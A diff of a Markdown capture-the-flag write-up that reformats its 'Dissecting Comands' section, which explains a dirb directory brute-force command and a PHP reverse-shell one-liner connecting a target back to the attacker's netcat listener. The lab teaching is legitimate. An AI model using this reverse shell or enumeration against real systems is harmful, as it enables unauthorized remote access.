@@ -312,20 +312,20 @@ fleeb juice
 
 # Dissecting Comands
 `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt`
-+ **x {FILENAME2 WORDLIST PATH}** specifies a file that contains a list of file extensions to be used during the file and directory brute-forcing or enumeration process
-+ **-r** specifies this to be a non recursive scan
-+ **> {FILENAME3}.txt** redirects the output to the specified text file
++ `x {FILENAME2 WORDLIST PATH}` specifies a file that contains a list of file extensions to be used during the file and directory brute-forcing or enumeration process
++ `-r` specifies this to be a non recursive scan
++ `> {FILENAME3}.txt` redirects the output to the specified text file
 
 
 `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
-+ **php -r** starts the PHP interpreter in "read and execute" mode, allowing us to run PHP code directly from the command line
-+ **$sock=fsockopen("{MACHINE IP}", {PORT NUMBER})** creates a TCP/IP socket connection to the specified machine IP address and port number of our active Netcat listener using the **fsocketopen()** PHP function, and then storing the resulting command in the **$sock** variable
-+ **exec("/bin/sh -i <&3 >&3 2>&3")** uses the exec() PHP function to execute the **/bin/sh -i <&3 >&3 2>&3** command on the target machine
-     + **/bin/sh** is the path to the Bourne shell interpreter
-     + **-i** makes the shell session interactive, allowing user input and otput
-     + **<&3** redirects the stantard input (STDINT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
-     + **>&3** redirects the stantard output (STDOUT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
-     + **2>&3** redirects the standard error (STDERR) of the shell to the socket connection in the **$sock** variable using file descriptor 3
++ `php -r` starts the PHP interpreter in "read and execute" mode, allowing us to run PHP code directly from the command line
++ `$sock=fsockopen("{MACHINE IP}", {PORT NUMBER})` creates a TCP/IP socket connection to the specified machine IP address and port number of our active Netcat listener using the **fsocketopen()** PHP function, and then storing the resulting command in the **$sock** variable
++ `exec("/bin/sh -i <&3 >&3 2>&3")` uses the exec() PHP function to execute the **/bin/sh -i <&3 >&3 2>&3** command on the target machine
+     + `/bin/sh` is the path to the Bourne shell interpreter
+     + `-i` makes the shell session interactive, allowing user input and otput
+     + `<&3` redirects the stantard input (STDINT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
+     + `>&3` redirects the stantard output (STDOUT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
+     + `2>&3` redirects the standard error (STDERR) of the shell to the socket connection in the **$sock** variable using file descriptor 3
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
